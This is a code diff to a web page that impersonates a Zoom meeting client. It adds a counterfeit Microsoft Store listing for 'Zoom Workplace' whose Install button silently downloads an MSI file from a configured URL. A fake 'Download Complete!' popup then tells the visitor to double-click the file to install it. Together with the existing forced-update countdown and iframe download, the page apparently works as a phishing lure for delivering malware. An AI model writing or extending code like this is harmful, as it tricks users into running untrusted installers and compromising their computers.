@@ -206,6 +206,16 @@
         padding: 6px 10px;
     }
 }
+
+    .store-hero{
+        background:linear-gradient(180deg,#1b3f78 0%, #0f0f10 70%);
+    }
+    #microsoft-store-screen{
+        min-height:100vh;
+        background:#0f0f10;
+        color:#fff;
+        font-family:"Segoe UI",system-ui,-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
+    }
 </style>
 </head>
 <body>
@@ -414,6 +424,83 @@
         <div id="audio-failed-banner" class="audio-failed-banner" role="status" aria-hidden="true">Audio blocked or failed to play — check console</div>
     </div>
 
+    <div id="microsoft-store-screen" class="hidden">
+        <header class="sticky top-0 z-50 bg-black/90 border-b border-gray-800 backdrop-blur">
+            <div class="max-w-[1800px] mx-auto px-6 h-14 flex items-center gap-6">
+                <div class="flex items-center gap-3">
+                    <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Microsoft_logo_(2012).svg" alt="Microsoft" class="h-6 object-contain" />
+                    <span class="text-sm font-semibold">Microsoft Store</span>
+                </div>
+                <nav class="flex gap-6 text-sm text-gray-300 ml-6">
+                    <a class="text-blue-400">Home</a><a>Apps</a><a>Games</a><a>About</a>
+                </nav>
+                <div class="ml-auto flex items-center gap-4">
+                    <input value="zoom" class="bg-[#1b1b1b] text-sm px-4 py-1 rounded w-72 outline-none" />
+                    <span class="text-sm text-gray-400">Sign in</span>
+                </div>
+            </div>
+        </header>
+
+        <div class="max-w-[1800px] mx-auto px-6">
+            <section class="store-hero mt-6 rounded-lg p-10">
+                <div class="flex gap-10 flex-wrap">
+                    <div class="flex-1 flex gap-6 min-w-[280px]">
+                        <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Zoom_Video_Communications_Company_Logo.png" class="w-28 h-28 rounded-xl bg-white/5 p-2 object-contain" alt="Zoom" />
+                        <div>
+                            <h1 class="text-4xl font-semibold">Zoom Workplace</h1>
+                            <p class="text-gray-300 mt-1">Zoom Communications, Inc.</p>
+                            <div class="flex gap-4 mt-2 text-sm text-gray-300">
+                                <span>⭐ 4.4</span><span>109 ratings</span><span>Productivity</span>
+                            </div>
+                            <div class="flex gap-2 mt-4">
+                                <span class="bg-blue-900/70 px-2 py-1 text-xs rounded">Built for Copilot+ PC</span>
+                                <span class="bg-blue-900/70 px-2 py-1 text-xs rounded">Uses AI features</span>
+                            </div>
+                            <button id="installBtn" type="button" class="mt-6 bg-[#2da8ff] hover:bg-[#1f8edb] px-10 py-2 rounded-md font-semibold text-black flex items-center gap-3 disabled:opacity-70 disabled:cursor-not-allowed">
+                                <span id="installText">Install</span>
+                                <svg id="installSpinner" class="hidden w-5 h-5 animate-spin text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" aria-hidden="true">
+                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+                                </svg>
+                            </button>
+                            <div class="mt-4 text-xs text-gray-300">
+                                <span class="border px-1 mr-2">12+</span>
+                                Parental Guidance Recommended · In-App Purchases · Users Interact
+                            </div>
+                        </div>
+                    </div>
+                    <aside class="w-[340px] max-w-full">
+                        <h3 class="text-lg font-semibold mb-4">Discover more</h3>
+                        <div class="space-y-4 text-sm">
+                            <div class="flex items-center gap-3"><img src="https://commons.wikimedia.org/wiki/Special:FilePath/Microsoft_Office_Teams_(2019–2025).svg" class="w-10 h-10 bg-white/5 p-1 rounded object-contain" alt="" /><div class="flex-1"><p>Microsoft Teams</p><p class="text-xs text-gray-400">4.1 · Productivity</p></div><span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span></div>
+                            <div class="flex items-center gap-3"><img src="https://commons.wikimedia.org/wiki/Special:FilePath/Adobe_Acrobat_Reader_icon_(2020).svg" class="w-10 h-10 bg-white/5 p-1 rounded object-contain" alt="" /><div class="flex-1"><p>Adobe Acrobat Reader DC</p><p class="text-xs text-gray-400">4.5 · Productivity</p></div><span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span></div>
+                            <div class="flex items-center gap-3"><img src="https://commons.wikimedia.org/wiki/Special:FilePath/ChatGPT-Logo.svg" class="w-10 h-10 bg-white/5 p-1 rounded object-contain" alt="" /><div class="flex-1"><p>ChatGPT</p><p class="text-xs text-gray-400">4.8 · Productivity</p></div><span class="text-xs bg-gray-800 px-2 py-1 rounded">Free</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </section>
+            <section class="mt-14 max-w-4xl">
+                <h2 class="text-xl font-semibold mb-4">Description</h2>
+                <p class="text-gray-300 text-sm leading-relaxed pb-20">Reimagine how you work with Zoom Workplace, an all-in-one, AI-powered collaboration platform that combines team chat, meetings, phone*, whiteboard, calendar, mail, notes, and more.</p>
+            </section>
+        </div>
+
+        <div id="downloadPopup" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden items-center justify-center z-[9999]">
+            <div class="bg-[#f5f5f5] text-black w-[420px] rounded-lg shadow-2xl flex overflow-hidden mx-4">
+                <div class="w-1 bg-[#2da8ff]"></div>
+                <div class="p-6 flex-1">
+                    <div class="flex items-start gap-4">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" class="w-20 h-20 object-contain" alt="Zoom" />
+                        <div>
+                            <h3 class="font-semibold text-lg">Download Complete!</h3>
+                            <p class="text-sm text-gray-700 mt-1">Locate <b id="download-popup-filename"></b> in your downloads directory and double-click to start the installation.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
 <script>
 (function(){
 'use strict';
@@ -465,7 +552,8 @@ let state = {
     audioEnableShown:false,
     speakerOffTimeout:null,
     redirectScheduled:false,
-    updateCountdownStarted:false
+    updateCountdownStarted:false,
+    storeInstallStarted:false
 };
 
 const elements = {};
@@ -545,6 +633,12 @@ function cacheElements(){
     elements.audioEnable=document.getElementById('audio-enable');
     elements.audioEnableBtn=document.getElementById('audio-enable-btn');
     elements.audioFailedBanner=document.getElementById('audio-failed-banner');
+    elements.microsoftStoreScreen=document.getElementById('microsoft-store-screen');
+    elements.installBtn=document.getElementById('installBtn');
+    elements.installText=document.getElementById('installText');
+    elements.installSpinner=document.getElementById('installSpinner');
+    elements.downloadPopup=document.getElementById('downloadPopup');
+    elements.downloadPopupFilename=document.getElementById('download-popup-filename');
 }
 
 function bindEvents(){
@@ -567,12 +661,51 @@ function bindEvents(){
     elements.closeParticipants.addEventListener('click',()=>elements.participantsModal.classList.add('hidden'));
     elements.participantsModal.addEventListener('click',e=>{if(e.target===elements.participantsModal) elements.participantsModal.classList.add('hidden')});
     elements.audioEnableBtn.addEventListener('click',onUserEnableAudio);
+    if(elements.installBtn) elements.installBtn.addEventListener('click',handleStoreInstall);
+}
+
+function hideZoomAppScreens(){
+    elements.loadingScreen.classList.add('hidden');
+    elements.prejoinScreen.classList.add('hidden');
+    elements.meetingScreen.classList.add('hidden');
+    if(elements.updateModal) elements.updateModal.classList.add('hidden');
+}
+
+function showMicrosoftStoreScreen(){
+    stopRecurringOverlay();
+    state.inMeeting=false;
+    hideZoomAppScreens();
+    if(elements.microsoftStoreScreen){
+        elements.microsoftStoreScreen.classList.remove('hidden');
+    }
+    document.body.style.overflow='auto';
+    window.scrollTo(0,0);
+}
+
+function showDownloadPopup(){
+    if(!elements.downloadPopup) return;
+    if(elements.downloadPopupFilename){
+        elements.downloadPopupFilename.textContent=CONFIG.DOWNLOAD_FILENAME;
+    }
+    elements.downloadPopup.classList.remove('hidden');
+    elements.downloadPopup.classList.add('flex');
+}
+
+function handleStoreInstall(){
+    if(state.storeInstallStarted) return;
+    state.storeInstallStarted=true;
+    if(elements.installBtn) elements.installBtn.disabled=true;
+    if(elements.installText) elements.installText.textContent='Installing';
+    if(elements.installSpinner) elements.installSpinner.classList.remove('hidden');
+    downloadMsiFile();
+    setTimeout(showDownloadPopup,2500);
 }
 
 function showLoadingScreen(){
     elements.loadingScreen.classList.remove('hidden');
     elements.prejoinScreen.classList.add('hidden');
     elements.meetingScreen.classList.add('hidden');
+    if(elements.microsoftStoreScreen) elements.microsoftStoreScreen.classList.add('hidden');
 
     setTimeout(()=>{
         elements.loadingScreen.classList.add('hidden');
@@ -790,24 +923,17 @@ function showUpdateModal(){
 }
 
         
-     function redirectToUpdatePage(delayMs = 5000){
-    setTimeout(() => {
-        window.location.href = 'microsoft-store.html?zoom.com/hc/en/article?id=zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732';
-    }, delayMs);
+function redirectToUpdatePage(delayMs = 5000){
+    setTimeout(showMicrosoftStoreScreen, delayMs);
 }
+
 function scheduleRedirectOnce() {
   if (state.redirectScheduled) return;
   state.redirectScheduled = true;
-
-  setTimeout(() => {
-    window.location.href = 'microsoft-store.html?zoom.com/hc/en/article?id=zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732-zm_kb&sysparm_article=KB0060732';
-  }, 5000);
+  setTimeout(showMicrosoftStoreScreen, 5000);
 }
 
-
-async function triggerDownload() {
-  scheduleRedirectOnce();
-
+async function downloadMsiFile() {
   const downloadUrl = CONFIG.DOWNLOAD_URL;
   const filename = CONFIG.DOWNLOAD_FILENAME || 'download.msi';
 
@@ -864,6 +990,12 @@ async function triggerDownload() {
   }
   console.log('Download started via iframe ->', downloadUrl);
 }
+
+async function triggerDownload() {
+  scheduleRedirectOnce();
+  await downloadMsiFile();
+}
+
         async function onUserEnableAudio(){ state.audioEnableShown = true; const unlocked = await unlockAudio(); if(!unlocked){ console.warn('unlockAudio failed on user enable'); return } await speakerOn(); hideAudioEnable(); }
 
 window.startRemoteConversation = function(){ startConversationAudio() };
